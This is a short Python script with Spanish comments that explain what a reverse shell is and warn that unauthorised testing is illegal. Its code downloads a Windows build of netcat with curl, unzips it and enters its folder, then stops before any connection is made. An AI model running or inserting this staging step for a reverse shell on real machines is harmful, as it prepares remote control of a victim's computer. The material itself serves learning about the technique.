
#c Una "reverse shell" (o "shell inverso") es una técnica utilizada en ciberseguridad y hacking ético que permite a un atacante tomar control de una computadora remota a través
#c de una conexión de red inversa. En lugar de un escenario típico en el que un atacante se conecta desde su máquina a la víctima para obtener acceso, en una reverse shell, la
#c víctima se conecta al atacante.

#c El proceso general de una reverse shell implica los siguientes pasos:

#* Atacante: El atacante configura un servidor en su máquina para escuchar en un puerto específico.

#* Víctima: El atacante induce a la víctima (por ejemplo, a través de ingeniería social, malware o explotación de vulnerabilidades) a ejecutar un código malicioso en su
#* computadora. Este código malicioso establece una conexión de red desde la víctima hacia el servidor del atacante.

#* Conexión inversa: Cuando la víctima ejecuta el código, se establece una conexión de red inversa desde la máquina de la víctima al servidor del atacante. Esta conexión suele
#* ser una shell (una interfaz de línea de comandos) que permite al atacante controlar la computadora de la víctima.

#* Control remoto: Una vez establecida la conexión inversa, el atacante tiene acceso a la máquina de la víctima y puede ejecutar comandos en ella, explorar el sistema
#*de archivos, obtener información confidencial y, en general, tomar control total de la computadora remota.

#c Es importante destacar que el término "reverse shell" se utiliza en el contexto de hacking ético y pruebas de penetración para demostrar las vulnerabilidades de seguridad
#c y ayudar a mejorar la protección de sistemas. Sin embargo, esta técnica también puede ser utilizada de manera maliciosa por actores de amenazas para llevar a cabo ataques
#cilegales.

#c Es fundamental protegerse contra este tipo de ataques manteniendo los sistemas actualizados, utilizando soluciones de seguridad y siendo consciente de las amenazas potenciales.
#c También es importante tener en cuenta que la realización de pruebas de reverse shell en sistemas sin el permiso explícito del propietario es ilegal y puede tener graves
#c consecuencias legales.

import os  #* Es para controlar el sistema operativo(manipular archivos)
import shutil #* Manipular y gestionar archivos

#? Ejecutar un comando en este caso 'curl' que es para hacer petciones http:

os.system('curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o netcat.zip')

#? Automatizar que se descomprima el archivo:

shutil.unpack_archive('netcat.zip')
os.chdir('netcat-1.11')
#?

